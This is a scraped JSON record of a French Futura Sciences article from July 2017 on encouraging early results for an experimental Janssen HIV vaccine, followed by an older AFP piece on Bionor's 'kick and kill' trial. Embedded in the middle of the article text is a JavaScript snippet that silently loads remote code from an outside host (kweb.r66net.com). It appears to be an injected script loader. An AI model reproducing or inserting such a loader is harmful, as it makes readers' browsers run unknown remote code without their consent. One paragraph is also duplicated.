{"title": "VIH : un vaccin expérimental contre le Sida montre des signes encourageants", "newspaper": "Futura Sciences", "author": "Par Futura avec l'AFP", "date_publi": "26/07/2017", "content": "Le 1 er  décembre 2017 était la journée mondiale de lutte contre le Sida. C'est l'occasion de faire le point sur les dernières avancées médicales sur la recherche d'un vaccin. En juillet 2017, comme nous le rapportions, des résultats encourageants ont été publiés par le laboratoire Janssen. Dans une étude à un stade encore préliminaire, 100 % des participants ont développé une réponse immunitaire avec un prototype de vaccin. Une note d'optimisme alors que la mise au point d'un vaccin efficace contre le VIH peine à aboutir depuis des années. Article paru le 26 juillet 2017 Testé chez 393 volontaires dans cinq pays (Afrique du Sud, Ouganda, États-Unis, Rwanda et Thaïlande), un prototype de  vaccin  contre le  VIH , développé par le laboratoire Janssen (groupe Johnson and Johnson), a entraîné une réponse immunitaire (la production d' anticorps ) chez 100 % des participants, selon l'étude présentée le 24 juillet 2017 lors de la conférence internationale de  recherche sur le sida , à Paris. « Ces données prometteuses, combinées aux avancées d'autres chercheurs dans ce domaine, autorisent à être de nouveau optimiste quant à la possibilité de développer un vaccin contre le VIH » , a estimé le Pr Dan Barouch, membre de l'équipe de recherche, au cours d'une conférence de presse. Selon les experts, un  vaccin  resterait le meilleur moyen de mettre fin à une  épidémie  qui a contaminé 76 millions de personnes et provoqué 35 millions de décès depuis son apparition, au début des années 1980. Malgré les moyens de  prévention  disponibles, 1,8 million de nouvelles infections ont encore eu lieu en 2016, selon l'Onusida. Et  « à ce jour, seuls quatre projets de vaccin ont atteint le stade du test de leur efficacité clinique » , a rappelé Dan Barouch, les autres ayant été abandonnés en phase préliminaire en raison de leur manque d'efficacité. Selon les experts, un vaccin resterait le meilleur moyen de mettre fin à une épidémie qui a contaminé 76 millions de personnes et provoqué 35 millions de décès depuis son apparition, au début des années 1980. © Remains, istock.com                               La phase suivante des tests du vaccin contre le VIH débuterait fin 2017 Ce nouveau vaccin expérimental,  « à double détente » , consiste tout d'abord à mettre en éveil le  système immunitaire  avec un banal  virus  de rhume, avant de le doper avec une  protéine  se trouvant sur l'enveloppe du VIH, déclenchant une réaction plus vigoureuse de l'organisme.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Dans une phase précédente sur des  singes , dont les résultats ont été publiés il y a deux ans, cette stratégie avait permis d'empêcher l'infection chez les deux tiers des  primates , a rappelé Dan Barouch, virologue et professeur à la faculté de médecine de l'université de Harvard.  « Bien sûr, on ne sait pas encore si ce vaccin protègera les humains. Mais ces données justifient de mener une étude d'efficacité à plus grande échelle » , a-t-il estimé. Après une nouvelle évaluation, la phase suivante des tests, sur des participants présentant un risque élevé de  contamination  par le  VIH , pourrait débuter  « fin 2017 ou début 2018 » , dans des pays du sud de l'Afrique, a indiqué dans un communiqué le laboratoire Janssen. Mettre au point un vaccin sera  « très difficile » , mais un succès  « bouleverserait le paysage » , a expliqué à l'AFP Anthony Fauci, directeur de l'Institut national des  allergies  et des maladies infectieuses ( NIAID ), un organisme public de recherche américain.  « Même si on obtient une efficacité de 50 à 60 %, [...] cela aurait un impact majeur sur la pandémie » , a-t-il ajouté. Un autre vaccin expérimental, baptisé HVTN 702, fait actuellement l'objet d'un  essai clinique  à grande échelle en Afrique du Sud. Voir aussi : Sida : des chercheurs français ont-ils trouvé l’arme fatale contre le VIH ? Pour en savoir plus Un vaccin norvégien contre le Sida montre son efficacité Article de l'AFP publié le 24 décembre 2015 La société de  biotechnologie  norvégienne Bionor, qui développe un vaccin contre le VIH, a annoncé de premiers résultats encourageants d'un traitement qui déloge le virus des « réservoirs » dans lesquels il se cache sous forme dormante. « C'est une réussite majeure pour trouver une  guérison  fonctionnelle au VIH » , a expliqué à l'AFP le porte-parole de Bionor, Jørgen Fischer Ravn. Actuellement, les  traitements antirétroviraux  permettent de garder le contrôle du virus chez les patients  séropositifs , mais sans les en débarrasser définitivement. Le virus responsable du  Sida  reste en effet tapi dans le corps de personnes traitées, sous forme dormante, mais réapparaît dès l'arrêt des traitements. Ce réservoir, difficile à atteindre, est l'un des plus grands obstacles à l'élaboration d'un traitement permettant d'assurer une guérison certaine. L'expérience menée par Bionor à l'université d'Aarhus, au Danemark, sur 20 patients séropositifs a permis de déloger le virus  dormant  du réservoir grâce à la romidepsine, un  anticancéreux , puis de l'éliminer partiellement. Chaque patient avait été préalablement vacciné avec Vacc-4x, que Bionor développe.  « Après l'activation du virus, qui normalement devrait déboucher sur la détection du virus dans le sang, Vacc-4x a garanti l'élimination des cellules produisant le virus, maintenant un niveau indétectable ou très bas de virus dans le sang de 15 des 17 patients qui ont participé au programme jusqu'à la fin de l'expérience » , a indiqué Jørgen Fischer Ravn. « Réveiller » le virus dormant, le déloger et l'éliminer ( « kick and kill » ) est une stratégie prometteuse pour débarrasser les patients du  VIH , mais les tests menés par Bionor n'ont pas été validés ni publiés par une revue scientifique. Avec plus de 34 millions de morts à ce jour, le  VIH  continue d'être un problème majeur de santé publique, selon l' OMS . Fin 2014, on comptait dans le monde environ 36,9 millions de personnes vivant avec le virus. Ce qu'il faut retenir Un prototype de vaccin contre le VIH a entraîné une réponse immunitaire chez 100 % des 393 volontaires. Ce vaccin expérimental consiste à mettre en éveil le système immunitaire avec un banal virus de rhume, avant de le doper avec une protéine se trouvant sur l’enveloppe du VIH, déclenchant une réaction plus vigoureuse de l’organisme. Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  vaccin contre le sida  |  efficacite vaccin  |  vaccin grippe efficacite  |  vaccin sida  |  sida vaccin  |  vaccin contre rage  |  nom du vaccin contre tetanos", "theme": "sante"}